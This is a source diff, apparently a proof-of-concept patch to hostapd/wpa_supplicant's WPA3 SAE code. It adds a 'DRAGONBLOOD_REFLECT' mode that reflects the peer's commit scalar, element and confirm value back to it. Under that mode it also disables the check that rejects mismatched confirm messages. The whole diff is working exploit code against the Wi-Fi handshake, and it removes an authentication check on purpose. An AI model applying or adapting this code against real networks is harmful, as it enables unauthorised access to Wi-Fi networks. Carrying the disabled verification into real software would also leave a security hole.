@@ -713,6 +713,33 @@ static int sae_derive_commit(struct sae_data *sae)
 	    (sae->tmp->dh && sae_derive_commit_element_ffc(sae, mask) < 0))
 		goto fail;
 
+#ifdef DRAGONBLOOD_REFLECT
+	/** Override the scalar and element with the peer's */
+	if (sae->peer_commit_scalar)
+	{
+		/** own_commit_scalar = peer_commit_scalar */
+		crypto_bignum_setint(sae->tmp->own_commit_scalar, 0);
+		crypto_bignum_add(sae->tmp->own_commit_scalar, sae->peer_commit_scalar,
+			sae->tmp->own_commit_scalar);
+
+		if (sae->tmp->ec)
+		{
+			/** own_commit_element_ecc = peer_commit_element_ecc */
+			if (sae->tmp->own_commit_element_ecc)
+				crypto_ec_point_deinit(sae->tmp->own_commit_element_ecc, 0);
+			sae->tmp->own_commit_element_ecc = crypto_ec_point_copy(sae->tmp->peer_commit_element_ecc, sae->tmp->ec);
+
+			poc_log("\x00\x00\x00\x00\x00\x00", "Reflected scalar and element\n");
+		}
+		else if (sae->tmp->dh)
+		{
+			poc_log("\x00\x00\x00\x00\x00\x00", "TODO: Reflect FFC element\n");
+			// TODO: Implement this
+			exit(1);
+		}
+	}
+#endif // DRAGONBLOOD_REFLECT
+
 	ret = 0;
 fail:
 	crypto_bignum_deinit(mask, 1);
@@ -1368,6 +1395,7 @@ void sae_write_confirm(struct sae_data *sae, struct wpabuf *buf)
 	if (sae->send_confirm < 0xffff)
 		sae->send_confirm++;
 
+#ifndef DRAGONBLOOD_REFLECT
 	if (sae->tmp->ec)
 		sae_cn_confirm_ecc(sae, sc, sae->tmp->own_commit_scalar,
 				   sae->tmp->own_commit_element_ecc,
@@ -1380,6 +1408,12 @@ void sae_write_confirm(struct sae_data *sae, struct wpabuf *buf)
 				   sae->peer_commit_scalar,
 				   sae->tmp->peer_commit_element_ffc,
 				   wpabuf_put(buf, SHA256_MAC_LEN));
+#else
+	/** Overwrite the confirm value */
+	memcpy(wpabuf_put(buf, SHA256_MAC_LEN), sae->received_confirm, SHA256_MAC_LEN);
+
+	poc_log("\x00\x00\x00\x00\x00\x00", "Reflecting received confirm value\n");
+#endif
 }
 
 
@@ -1412,6 +1446,10 @@ int sae_check_confirm(struct sae_data *sae, const u8 *data, size_t len)
 				   sae->tmp->own_commit_element_ffc,
 				   verifier);
 
+#ifdef DRAGONBLOOD_REFLECT
+	memcpy(sae->received_confirm, data + 2, SHA256_MAC_LEN);
+	poc_log("\x00\x00\x00\x00\x00\x00", "Copied confirm from received Confirm frame\n");
+#else
 	if (os_memcmp_const(verifier, data + 2, SHA256_MAC_LEN) != 0) {
 		wpa_printf(MSG_DEBUG, "SAE: Confirm mismatch");
 		wpa_hexdump(MSG_DEBUG, "SAE: Received confirm",
@@ -1420,6 +1458,7 @@ int sae_check_confirm(struct sae_data *sae, const u8 *data, size_t len)
 			    verifier, SHA256_MAC_LEN);
 		return -1;
 	}
+#endif
 
 	return 0;
 }
